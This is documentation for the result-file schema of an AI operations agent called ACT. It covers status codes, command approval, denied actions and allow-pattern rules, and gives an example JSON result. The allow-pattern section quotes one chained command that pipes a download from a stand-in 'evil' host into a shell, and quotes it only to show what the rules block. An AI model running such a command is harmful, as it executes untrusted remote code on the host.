# ACT result file — `act.result/1`

`--result-file PATH` (Linux) / `-ResultFile PATH` (Windows), or `ACT_RESULT_FILE`, makes a
one-shot run write one JSON object describing what happened. It is the contract automation
(Ansible, AAP, CI) builds on: parse this file, not ACT's console output.

- Written on **every** exit path of a task run: finished, refused, stopped by a harness
  limit, setup/config error, model error, Ctrl-C. Not written for the interactive REPL,
  `--version`, or `--undo`.
- Written atomically (temp file + rename). On Linux the file is mode `0600`.
- **Command output is never included.** It can carry secrets; `summary` holds the model's
  findings, and `--audit-log` is the durable step-by-step record.
- ACT-Linux and ACT-Windows emit the same keys in the same order.

## Top-level keys

| key | type | meaning |
|---|---|---|
| `schema` | string | always `"act.result/1"`; bumped only on an incompatible change |
| `act_version` | string | e.g. `"0.6.16"` |
| `platform` | string | `"linux"` or `"windows"` |
| `host`, `user`, `cwd` | string | where and as whom ACT ran |
| `task` | string | the task text (`"(analysis of piped input)"` for piped runs with no task) |
| `provider`, `model` | string | the model that ran the task |
| `started_at`, `finished_at` | string | UTC, `YYYY-MM-DDTHH:MM:SSZ` |
| `duration_s` | number | wall-clock seconds |
| `exit_code` | int | the process exit code (below) |
| `status` | string | `completed` \| `needs_approval` \| `stopped` \| `error` \| `cancelled` |
| `summary` | string | the model's final answer (empty if it never finished) |
| `stop_reason` | string | why a `stopped` / `error` / `cancelled` run ended; `""` otherwise |
| `changed` | bool | a non-read-only command ran, or a file write/edit succeeded |
| `commands` | list | every command that ran (below) |
| `denied` | list | actions refused in non-interactive mode — **the proposed fix** (below) |
| `files_changed` | list | `{action, path, ok}` for each structured edit/write attempted |
| `pre_approved_patterns` | list | the `--allow` / `ACT_ALLOW` patterns in force |
| `race` | object \| null | race-mode outcome: `{judge, outcome, chosen, candidates, dropped}` |
| `tokens` | int \| null | tokens used, when the provider reports them (always null on Windows) |
| `model_retries` | object | 0.6.22, always present (last key): `{length, rescue, rate_limited, content_filter}` integer counts - output-limit retries (`finish_reason: length`), empty-reply rescues, `Retry-After` waits, content-filter blocks. Additive: the schema stays `act.result/1`; readers of older files must treat it as optional |

### `status` and `exit_code`

| status | exit | meaning |
|---|---|---|
| `completed` | 0 | the model finished and the plan's evidence checks passed |
| `needs_approval` | 4 | at least one action needed approval and was refused (`--non-interactive`); the model was told and finished with its diagnosis. `denied` lists exactly what to approve |
| `stopped` | 4 | a harness limit ended the run (step limit, loop guard, no progress) |
| `error` | 2, 3, other | 2 = setup/usage/config (no key, bad `--allow` pattern); 3 = model/API failure |
| `cancelled` | 4 / 130 | ESC or Ctrl-C |

### `commands[]`

`{command, risk, approval, pattern, exit_code, duration_ms, timed_out, background, read_only}`

- `approval`: `auto` (no approval needed — proven read-only, or `--auto`), `pre_approved`
  (matched an `--allow` pattern; `pattern` says which), or `operator` (a person approved it
  interactively).
- `read_only`: false when the command could change the host; this drives `changed`.

### `denied[]`

`{kind, command, risk, reason, thought, pre_approvable}` — `kind` is `command` or `file`
(`command` then reads `edit <path>` / `write <path>`). `thought` is the model's stated reason
for proposing it. `pre_approvable` is true when an `--allow` pattern could ever approve this
exact command (a plain single command that is not a catastrophic payload; never a file change) — so an
approval workflow can hand it back to ACT as an exact-match pattern. When false, a person has
to apply that fix.

## Pre-approved commands (`--allow` / `-Allow` / `ACT_ALLOW`)

Each pattern is a regular expression that must match the **whole** command (Linux:
case-sensitive; Windows: case-insensitive, like PowerShell). A command is pre-approved only
if it is a single plain command:

- **Linux**: only the characters `A-Z a-z 0-9 space _ . / : = @ % + , -` — so no `;` `&` `|`
  `$` backticks `<` `>` globs, braces, quotes, `~`, or newlines. `--allow 'systemctl restart .*'`
  can never stretch to `systemctl restart x; curl evil | sh`.
- **Windows**: the PowerShell parser must see exactly one command with constant arguments —
  no pipeline, `;`, `&&`/`||`, redirection, call operator, variables, subexpressions, or arrays.

Danger-tier commands (forced single-file deletes, package removal, account changes, …) and
catastrophic payloads (recursive deletes, disk/partition tools, power state, …) are **never**
pre-approved, on Linux and Windows alike; `--auto` never approves them either. Patterns only ever apply to `run` commands — never to structured file edits/writes. With `--non-interactive`, `--allow` is an allowlist-only fix
mode: proven reads and the listed fixes run; everything else is refused and reported in
`denied`.

## Example

```json
{
  "schema": "act.result/1",
  "act_version": "0.6.16",
  "platform": "linux",
  "host": "web01",
  "user": "root",
  "cwd": "/root",
  "task": "Host web01 tripped these health checks: ...",
  "provider": "genai",
  "model": "gemini-3.5-flash",
  "started_at": "2026-09-24T18:02:11Z",
  "finished_at": "2026-09-24T18:03:40Z",
  "duration_s": 89.2,
  "exit_code": 4,
  "status": "needs_approval",
  "summary": "ROOT CAUSE: nginx failed after a config reload (duplicate listen 80). EVIDENCE: ... FIX: ... CONFIDENCE: high",
  "stop_reason": "",
  "changed": false,
  "commands": [
    {"command": "systemctl status nginx --no-pager", "risk": "safe", "approval": "auto",
     "pattern": null, "exit_code": 3, "duration_ms": 41, "timed_out": false,
     "background": false, "read_only": true}
  ],
  "denied": [
    {"kind": "command", "command": "systemctl restart nginx", "risk": "mutating",
     "reason": "systemd service/unit change", "thought": "config fixed upstream; restart",
     "pre_approvable": true}
  ],
  "files_changed": [],
  "pre_approved_patterns": [],
  "race": null,
  "tokens": 18342,
  "model_retries": {"length": 0, "rescue": 0, "rate_limited": 1, "content_filter": 0}
}
```
